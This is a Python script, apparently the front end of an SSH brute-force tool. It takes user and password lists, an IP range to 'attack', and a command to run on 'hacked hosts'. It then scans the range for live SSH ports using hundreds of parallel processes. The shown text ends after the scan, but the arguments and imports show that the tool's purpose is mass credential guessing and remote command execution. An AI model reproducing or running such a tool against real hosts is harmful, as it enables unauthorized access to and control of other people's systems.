#!/usr/bin/env python

import argparse

from password import Password
from ips import IPRangeGenerator, alive_check
from session import SSH
from art import banner
from multiprocessing import cpu_count, Pool, Manager
from os import getuid
from functools import partial

banner()

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', '--type', help="Select the type of password loading. If you use type 0, you will need to specify only the users file with the format user:password, if you specify type 1, then you will need two separate files for users and passwords.",
                        default=0, dest='pass_type')
arg_parser.add_argument('-u', '--users', help="Set the users file", default='data/users.txt', dest='users_file')
arg_parser.add_argument('-p', '--passwords', help="Set the passwords file", default='data/pass.txt', dest='pass_file')
arg_parser.add_argument('-a', '--attack', help="Specify IP range to attack and port number (standard port number is 22). Example: 192.168.*.*:22 . Also, running this program as root will improve speed.", required=True, dest='attack')
arg_parser.add_argument('-c', '--command', help="Specify the command to run on the hacked host. The output will be stored in a specified or default file.", default='uname -a', dest='command')
arg_parser.add_argument('-o', '--output', help="Specify the output file for hacked hosts.", default='data/output.txt', dest='output')
args = arg_parser.parse_args()

if getuid() == 0:
    root_rights = True
else:
    root_rights = False

if ':' in args.attack:
    ip_format = args.attack.split(':')[0]
    port      = args.attack.split(':')[1]
else:
    ip_format = args.attack
    port      = 22

passwords = Password(int(args.pass_type), [args.users_file, args.pass_file])
ips_list  = list(IPRangeGenerator(ip_format))

# print some information before scanning
print ("[*] IP range               : " + ip_format)
print ("[*] Command to run on hosts: " + args.command)
print ("[*] CPU cores              : " + str(cpu_count()))
print ("[*] Root rights            : " + ("Yes" if root_rights else "No"))
# --------------------------------------

# split a list in chunks
def chunker_list(seq, size):
    return (seq[i::size] for i in range(size))

def worker(ips, alive):
    for ip in ips:
        if alive_check(ip, port): alive.append(ip)

# shared state between processes
alive_ips = Manager().list()

count = cpu_count() * 100
# split data
ips_chunks = list(chunker_list(ips_list, count))

print ("[*] Colecting IPs, please wait (it should take few minutes)...")
# create a pool with the same shared state
pool = Pool(count)
custom_worker = partial(worker, alive=alive_ips)
pool.map(custom_worker, ips_chunks)
